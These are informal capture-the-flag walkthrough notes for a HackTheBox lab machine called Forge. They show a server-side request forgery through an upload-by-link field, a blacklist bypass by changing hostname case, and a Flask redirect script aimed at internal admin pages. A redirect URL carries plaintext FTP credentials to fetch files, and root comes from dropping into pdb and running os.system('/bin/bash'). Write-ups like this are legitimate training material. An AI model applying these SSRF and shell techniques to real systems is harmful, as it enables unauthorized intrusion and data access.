we have a site with 2 options to upload a file

after trying upload a file was of no use

so we tried to upload via link

pointing it our ip it gives back connection but when pointing it to its own localaddress or ip not says blacklisted

we can change the casing of  the ip like  ==ForGe.Htb== and it gives back internal files

OR

so created a ==python scrip==t to redirect it its own ip when it connect to our own ip

```
#!/usr/bin/env python

from flask import Flask, redirect, request

app = Flask(__name__)

@app.route("/")
def admin():
    return redirect('http://admin.forge.htb/')

@app.route("/1")
def announcements():
    return redirect('http://admin.forge.htb/announcements')

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=80)
```

the host page / said to look into announcent for ftp and it gave creds

so for ftp we added

```
@app.route("/3")
def ftp_via_admin():
    f = request.args.get('f', default='')
    return redirect(f'http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/{f}')
```

and we got files

now for root part

we had a file with secret in it says to run nc on a random port on runing it it prints the random port so we made 2 session and on other session we used that port and as we put some random char it gives us ==pdb== on first connection

now we can

```
import os;os.system("/bin/bash")
```

and we have a shell
